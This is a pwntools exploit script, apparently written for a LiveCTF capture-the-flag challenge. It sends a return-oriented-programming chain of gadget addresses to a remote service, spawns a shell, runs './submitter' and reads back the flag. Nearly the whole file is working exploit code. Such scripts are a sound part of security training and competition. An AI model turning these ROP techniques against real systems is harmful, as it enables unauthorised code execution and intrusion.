#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['konsole', '-e']

# exe = context.binary = ELF(args.EXE or 'challenge')
context.arch = 'amd64'

# nc = 'localhost 1337'
# nc = nc.split()
# if len(nc) == 3:
#     host, port = nc[1:]
# else:
#     host, port = nc[:2]

# host = args.HOST or host
# port = int(args.PORT or port)

host = os.environ.get('HOST', 'localhost')
port = 31337

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main

b *0x401A54

# b *0x401A24

continue
'''.format(**locals())

ru  = lambda *x, **y: io.recvuntil(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
rc  = lambda *x, **y: io.recv(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
ia  = lambda *x, **y: io.interactive(*x, **y)

protect_ptr = lambda pos, ptr: (pos >> 12) ^ ptr

def decrypt_ptr(val):
    mask = 0xfff << (64-12)
    while mask:
        v = val & mask
        val ^= v >> 12
        mask >>= 12
    return val

def parse_leak(leak):
    return u64(leak + bytes(8-len(leak)))

def bhtoi(buf):
    return shtoi(buf.decode())

def shtoi(string):
    if string.startswith('0x'):
        string = string[2:]
    return int(string, 16)

def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__}({args} {kwargs})")
        ret_val = func(*args, **kwargs)
        info(f"{func.__name__} returned {ret_val}")
        return ret_val
    return wrapper


# -- Exploit goes here --

io = start()


def send_addresses(io: tube, payload: bytes):
    for start in range(0, len(payload), 8):
        end = start + 8

        int_str = payload[start:end]
        int_str = int_str[::-1]
        while int_str.startswith(b"\x00"):
            int_str = int_str.removeprefix(b"\x00")

        io.recvuntil(b"Addr pls: ")
        for n in int_str:
            io.send(f"{int(hex(n)[2:])}".rjust(2, '0').encode())
        io.sendline()


adds = [0x0000000000402125, 0x15, 0x15, 0x0000000000402125, 0x15, 0x15,
        0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,0x0000000000469172,
    0x0000000000469102, 0x0000000000469102, 0x0000000000469102, 0x0000000000469102, 0x0000000000469102, 0x0000000000469102, 0x0000000000469102, 0x0000000000469102,
    0x0000000000493972,
        0x0000000000437486, 0x15,
0x0000000000493932, 0x0000000000493932, 0x0000000000493932, 0x0000000000493932, 0x0000000000493932, 
0x0000000000469082,0x0000000000469082,0x0000000000469082,0x0000000000469082,0x0000000000469082,0x0000000000469082,0x0000000000469082,
        0x0000000000493982
       ]

adds = [
    0x0000000000493962, #: add eax, 0x3f6f1; ret;
    *([0x0000000000468873, 7]*2), #: add eax, 0x65520; pop rbp; ret;
    # *([0x0000000000493932]*1), #: add eax, 0x3f709; ret;
    *([0x0000000000469082]*11), #: add eax, 0x23f9; test edx, 0x40000000; je 0x6903e; ret;
    0x0000000000493952, #: add eax, 0x3f6f9; ret; 
    # 0x0000000000466858, #: add eax, 0x67527; ret;
    *([0x0000000000493992]*7),#: add eax, 0x3f6d9; ret; 
    *([0x0000000000466848]*1), #: add eax, 0x67533; ret;  3
    0x0000000000437486, 0x7, #: add eax, 0x9bc21; pop rbp; ret; 1
    # 0x0000000000466878, #: add eax, 0x6750f; ret; 1
    *([0x0000000000493972]*2), #: add eax, 0x3f6e9; ret;

]

payload = flat(
    0x666,
    0x666,
    0x666,
    0x455555555,

    # get rax to 7:
    0x0000000000402218,#: pop rdi; pop rbp; ret;
    7,
    7,
    0x0000000000426896,#: add rax, rdi; vzeroupper; ret;


    0x0000000000445672, # 0x0000000000445672: mov rdx, 0xffffffffffffffe0; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret;
    # 0x401965, # ret

    *adds, # ret addr
    0x401914, # mid blah
    0
)
send_addresses(io, payload)
# for i in payload:
#     sla(b'Addr pls:', '%d' % i)

sleep(1)
sl(b'ls')
sl(b'./submitter')
# sl(b'whoami')
flag = io.recvline_contains(b'LiveCTF{', timeout=2).decode().strip()
if flag:
    log.info('Flag: %s', flag)
flag = io.recvline_contains(b'Flag', timeout=2).decode().strip()[5:]
if flag:
    log.info('Flag: %s', flag)

# ia()

# ia()
